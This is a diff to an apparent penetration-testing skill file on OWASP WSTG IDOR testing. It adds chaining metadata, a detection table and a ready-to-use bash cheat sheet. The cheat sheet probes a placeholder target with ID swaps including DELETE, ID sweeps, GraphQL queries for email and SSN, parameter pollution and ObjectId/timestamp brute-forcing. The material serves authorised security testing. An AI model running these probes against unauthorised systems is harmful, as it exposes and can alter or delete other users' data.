@@ -8,9 +8,11 @@ author: cyberstrike-official
 tags: [authorization, access-control, privilege, wstg, authz]
 tech_stack: []
 cwe_ids: [CWE-639]
-chains_with: []
-prerequisites: []
-severity_boost: {}
+chains_with: [wstg-authz-01, wstg-authz-02]
+prerequisites: [wstg-idnt-01, wstg-idnt-02]
+severity_boost:
+  wstg-authz-01: "IDOR + Directory Traversal = object references discovered via IDOR feed directly into traversal payloads, exposing arbitrary files for any user record (Critical)"
+  wstg-authz-02: "IDOR + Authorization Bypass = read access to other users' objects combines with the ability to bypass write/modify checks on them (Mass Account Takeover via Object Modification, Critical)"
 ---
 
 # wstg-authz-04
@@ -520,6 +522,87 @@ curl -s -X POST "https://target.com/graphql" \
 
 ---
 
+## Example Commands/Payloads
+
+### Ready-to-Use IDOR Cheat Sheet
+
+```bash
+BASE="https://{target}"
+TOKEN="user_a_token"
+OWN_ID=100
+OTHER_ID=101
+
+# Direct ID swap across HTTP methods
+for m in GET PUT PATCH DELETE; do
+  curl -s -o /dev/null -w "$m /api/users/$OTHER_ID/profile -> %{http_code}\n" \
+    -X "$m" "$BASE/api/users/$OTHER_ID/profile" -H "Authorization: Bearer $TOKEN"
+done
+
+# Sequential ID sweep
+for id in $(seq $((OWN_ID-5)) $((OWN_ID+5))); do
+  [ "$id" = "$OWN_ID" ] && continue
+  code=$(curl -s -o /dev/null -w "%{http_code}" "$BASE/api/users/$id/profile" -H "Authorization: Bearer $TOKEN")
+  [ "$code" = "200" ] && echo "[VULN] IDOR at id=$id"
+done
+
+# IDOR via request body / GraphQL
+curl -s -X POST "$BASE/api/user/orders" -H "Authorization: Bearer $TOKEN" \
+    -H "Content-Type: application/json" -d "{\"user_id\": $OTHER_ID}"
+
+curl -s -X POST "$BASE/graphql" -H "Authorization: Bearer $TOKEN" \
+    -H "Content-Type: application/json" \
+    -d "{\"query\": \"query { user(id: $OTHER_ID) { id name email ssn } }\"}"
+
+# Encoded ID (Base64 / hex) sweep
+for id in $(seq $((OWN_ID-5)) $((OWN_ID+5))); do
+  b64=$(echo -n "$id" | base64)
+  curl -s -o /dev/null -w "b64($id)=$b64 -> %{http_code}\n" \
+    "$BASE/api/data/$b64" -H "Authorization: Bearer $TOKEN"
+done
+
+# HTTP Parameter Pollution
+curl -s "$BASE/api/data?user_id=$OWN_ID&user_id=$OTHER_ID" -H "Authorization: Bearer $TOKEN"
+curl -s "$BASE/api/data?user_id[]=$OWN_ID&user_id[]=$OTHER_ID" -H "Authorization: Bearer $TOKEN"
+
+# Wildcard parameter — some backends return every record when the ID is a wildcard
+for w in '*' '%' '_' '.'; do
+  curl -s -o /dev/null -w "id=$w -> %{http_code}\n" "$BASE/api/users/$w" -H "Authorization: Bearer $TOKEN"
+done
+
+# Array-wrap a scalar ID — some frameworks unwrap {"id":[19]} to bypass an ownership check written for a plain int
+curl -s -X POST "$BASE/api/user/orders" -H "Authorization: Bearer $TOKEN" -H "Content-Type: application/json" \
+    -d "{\"user_id\": [$OTHER_ID]}"
+
+# Content-Type swap — try XML if the JSON endpoint enforces ownership but the XML parser path doesn't
+curl -s -X POST "$BASE/api/user/orders" -H "Authorization: Bearer $TOKEN" -H "Content-Type: application/xml" \
+    -d "<request><user_id>$OTHER_ID</user_id></request>"
+
+# MongoDB ObjectId prediction — ObjectIds encode a 4-byte Unix timestamp + machine/process/counter bytes;
+# if a victim's approximate creation time is known, nearby ObjectIds can be brute-forced
+python3 -c "
+import time, binascii
+ts = int(time.time()) - 3600  # ~1 hour window around target's signup/creation time
+print(binascii.hexlify(ts.to_bytes(4, 'big')).decode())  # use as prefix, brute-force remaining 8 bytes
+"
+
+# Unix epoch timestamp as ID — increment/decrement around a known creation time
+for delta in $(seq -290 10 290); do
+  ts=$(( $(date +%s) + delta ))
+  curl -s -o /dev/null -w "ts=$ts -> %{http_code}\n" "$BASE/api/documents/$ts" -H "Authorization: Bearer $TOKEN"
+done
+```
+
+### Detection Patterns
+
+| Signal                                             | Meaning                       |
+| ----------------------------------------------------- | -------------------------------- |
+| `200` + other user's data returned on ID swap          | Classic IDOR/BOLA confirmed     |
+| `PUT`/`DELETE` on foreign ID returns `200`/`204`        | Write/delete IDOR (higher risk) |
+| GraphQL field resolves for arbitrary `id` without auth check | GraphQL IDOR                |
+| Encoded ID still resolves after transform               | Obfuscation ≠ authorization     |
+
+---
+
 ## Remediation Guide
 
 ### 1. Implement Authorization Checks
@@ -695,6 +778,7 @@ class Document(db.Model):
 - [OWASP WSTG - IDOR Testing](https://owasp.org/www-project-web-security-testing-guide/latest/4-Web_Application_Security_Testing/05-Authorization_Testing/04-Testing_for_Insecure_Direct_Object_References)
 - [OWASP IDOR Prevention Cheat Sheet](https://cheatsheetseries.owasp.org/cheatsheets/Insecure_Direct_Object_Reference_Prevention_Cheat_Sheet.html)
 - [PortSwigger IDOR](https://portswigger.net/web-security/access-control/idor)
+- [PayloadsAllTheThings - Insecure Direct Object References](https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Insecure%20Direct%20Object%20References)
 
 
 ---
